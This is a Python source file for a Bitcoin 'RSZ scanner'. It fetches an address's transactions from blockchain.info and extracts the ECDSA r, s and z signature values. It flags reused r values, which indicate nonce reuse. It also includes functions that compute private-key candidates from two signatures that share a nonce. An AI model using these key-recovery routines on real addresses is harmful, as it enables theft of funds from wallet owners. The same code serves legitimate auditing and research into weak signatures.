# -*- coding: utf-8 -*-
"""
@author: iceland
"""
import sys
import json
from urllib.request import urlopen
import secp256k1 as ice

G = ice.scalar_multiplication(1)
N = ice.N
ZERO = ice.Zero
bP = 100000000  # BSGS table size

def get_rs(sig):
    rlen = int(sig[2:4], 16)
    r = sig[4:4+rlen*2]
    s = sig[8+rlen*2:]
    return r, s

def split_sig_pieces(script):
    sigLen = int(script[2:4], 16)
    sig = script[2+2:2+sigLen*2]
    r, s = get_rs(sig[4:])
    pubLen = int(script[4+sigLen*2:4+sigLen*2+2], 16)
    pub = script[4+sigLen*2+2:]
    assert(len(pub) == pubLen*2)
    return r, s, pub

def parseTx(txn):
    """Parse transaction and handle both legacy and witness formats"""
    if len(txn) < 130:
        raise ValueError('RawTx most likely incorrect')
    
    inp_list = []
    ver = txn[:8]
    cur = 8
    
    # Check for witness flag
    has_witness = False
    witness_data = []
    if txn[cur:cur+4] == '0001':
        has_witness = True
        cur += 4
    
    # Parse input count
    inp_nu = int(txn[cur:cur+2], 16)
    first = txn[:cur+2]
    cur += 2
    
    # Parse inputs
    for m in range(inp_nu):
        prv_out = txn[cur:cur+64]
        var0 = txn[cur+64:cur+64+8]
        cur = cur+64+8
        scriptLen = int(txn[cur:cur+2], 16)
        script = txn[cur:2+cur+2*scriptLen]
        seq = txn[2+cur+2*scriptLen:10+cur+2*scriptLen]
        cur = 10+cur+2*scriptLen
        
        # Store script for later
        inp_list.append([prv_out, var0, script, seq])
    
    # Parse outputs
    out_count = int(txn[cur:cur+2], 16)
    cur += 2
    
    # Skip outputs
    for _ in range(out_count):
        value_len = 16
        cur += value_len
        script_len = int(txn[cur:cur+2], 16) * 2
        cur += 2 + script_len
    
    # Parse witness data if present
    if has_witness:
        for _ in range(inp_nu):
            stack_items = []
            stack_size = int(txn[cur:cur+2], 16)
            cur += 2
            for _ in range(stack_size):
                item_len = int(txn[cur:cur+2], 16) * 2
                cur += 2
                item = txn[cur:cur+item_len]
                stack_items.append(item)
                cur += item_len
            witness_data.append(stack_items)
    
    # Get the rest (locktime)
    rest = txn[cur:]
    
    # Now process scripts and witness data
    result = []
    for i in range(inp_nu):
        prv_out, var0, script, seq = inp_list[i]
        
        if has_witness and len(witness_data[i]) >= 2:
            # Get signature and pubkey from witness data
            sig = witness_data[i][0]
            pub = witness_data[i][1]
            if len(sig) > 8:
                r, s = get_rs(sig)
            else:
                r, s = "0"*64, "0"*64
        else:
            try:
                r, s, pub = split_sig_pieces(script)
            except:
                r, s, pub = "0"*64, "0"*64, "0"*66
                
        result.append([prv_out, var0, r, s, pub, seq])
    
    return [first, result, rest]

def scan_address(address):
    """API için kullanılacak fonksiyon"""
    try:
        txid, cdx = check_tx(address)
        results = []
        
        for c in range(len(txid)):
            try:
                rawtx = get_rawtx_from_blockchain(txid[c])
                m = parseTx(rawtx)
                e = getSignableTxn(m)
                
                for i in range(len(e)):
                    if i == cdx[c]:
                        tx_info = {
                            'txid': txid[c],
                            'input_index': i,
                            'r': e[i][0],
                            's': e[i][1],
                            'z': e[i][2],
                            'pubkey': e[i][3]
                        }
                        results.append(tx_info)
            except Exception as e:
                print(f'Error processing tx {txid[c]}: {str(e)}')
                continue
        
        return {
            'address': address,
            'transactions': results,
            'total_transactions': len(results),
            'vulnerabilities': analyze_transactions(results) if results else []
        }
        
    except Exception as e:
        raise Exception(f"Error scanning address: {str(e)}")

def get_rawtx_from_blockchain(txid):
    try:
        htmlfile = urlopen("https://blockchain.info/rawtx/%s?format=hex" % txid, timeout = 20)
    except:
        print('Unable to connect internet to fetch RawTx. Exiting..')
        sys.exit(1)
    else: res = htmlfile.read().decode('utf-8')
    return res

def getSignableTxn(parsed):
    res = []
    first, inp_list, rest = parsed
    tot = len(inp_list)
    for one in range(tot):
        e = first
        for i in range(tot):
            e += inp_list[i][0] # prev_txid
            e += inp_list[i][1] # var0
            if one == i: 
                e += '1976a914' + HASH160(inp_list[one][4]) + '88ac'
            else:
                e += '00'
            e += inp_list[i][5] # seq
        e += rest + "01000000"
        z = ice.get_sha256(ice.get_sha256(bytes.fromhex(e))).hex()
        res.append([inp_list[one][2], inp_list[one][3], z, inp_list[one][4], e])
    return res

def HASH160(pubk_hex):
    iscompressed = True if len(pubk_hex) < 70 else False
    P = ice.pub2upub(pubk_hex)
    return ice.pubkey_to_h160(0, iscompressed, P).hex()

def diff_comb_idx(alist):
    LL = len(alist)
    RDD = []
    for i in range(LL):
        for j in range(i+1, LL):
            RDD.append((i, j, ice.point_subtraction(alist[i], alist[j])))
            RDD.append((i, j, ice.point_addition(alist[i], alist[j])))
    return RDD

def inv(a):
    return pow(a, N - 2, N)

def calc_RQ(r, s, z, pub_point):
    RP1 = ice.pub2upub('02' + hex(r)[2:].zfill(64))
    RP2 = ice.pub2upub('03' + hex(r)[2:].zfill(64))
    sdr = (s * inv(r)) % N
    zdr = (z * inv(r)) % N
    FF1 = ice.point_subtraction( ice.point_multiplication(RP1, sdr),
                                ice.scalar_multiplication(zdr) )
    FF2 = ice.point_subtraction( ice.point_multiplication(RP2, sdr),
                                ice.scalar_multiplication(zdr) )
    if FF1 == pub_point: 
        print('========  RSZ to PubKey Validation [SUCCESS]  ========')
        return RP1
    if FF2 == pub_point: 
        print('========  RSZ to PubKey Validation [SUCCESS]  ========')
        return RP2
    return '========  RSZ to PubKey Validation [FAIL]  ========'

def getk1(r1, s1, z1, r2, s2, z2, m):
    nr = (s2 * m * r1 + z1 * r2 - z2 * r1) % N
    dr = (s1 * r2 - s2 * r1) % N
    return (nr * inv(dr)) % N

def getpvk(r1, s1, z1, r2, s2, z2, m):
    x1 = (s2 * z1 - s1 * z2 + m * s1 * s2) % N
    xi = inv((s1 * r2 - s2 * r1) % N)
    x = (x1 * xi) % N
    return x

def all_pvk_candidate(r1, s1, z1, r2, s2, z2, m):
    xi = []
    xi.append( getpvk(r1, s1, z1, r2, s2, z2, m) )
    xi.append( getpvk(r1, -s1%N, z1, r2, s2, z2, m) )
    xi.append( getpvk(r1, -s1%N, z1, r2, -s2%N, z2, m) )
    xi.append( getpvk(r1, s1, z1, r2, -s2%N, z2, m) )
    return xi

def check_tx(address):
    """Get all transactions for an address"""
    txid = []
    cdx = []
    
    try:
        # İlk sayfa işlemleri al
        url = f'https://blockchain.info/rawaddr/{address}'
        htmlfile = urlopen(url, timeout=20)
        data = json.loads(htmlfile.read())
        
        # Her işlemi kontrol et
        for tx in data['txs']:
            for i, input in enumerate(tx['inputs']):
                if 'prev_out' in input and input['prev_out'].get('addr') == address:
                    txid.append(tx['hash'])
                    cdx.append(i)
                    
        print(f'Found {len(txid)} transactions for address {address}')
        return txid, cdx
        
    except Exception as e:
        print(f'Error fetching transactions: {str(e)}')
        return [], []

def analyze_transactions(transactions):
    """İşlemleri analiz et ve zayıflıkları bul"""
    vulnerabilities = []
    
    # R değeri tekrarı kontrolü
    r_values = [tx['r'] for tx in transactions]
    if len(r_values) != len(set(r_values)):
        vulnerabilities.append("Duplicate R value vulnerability detected")
    
    return vulnerabilities

# Ana program kodu sadece doğrudan çalıştırıldığında çalışsın
if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description='Bitcoin Address RSZ Scanner')
    parser.add_argument("-a", help="Address to scan", required=True)
    args = parser.parse_args()
    
    result = scan_address(args.a)
    print(json.dumps(result, indent=2))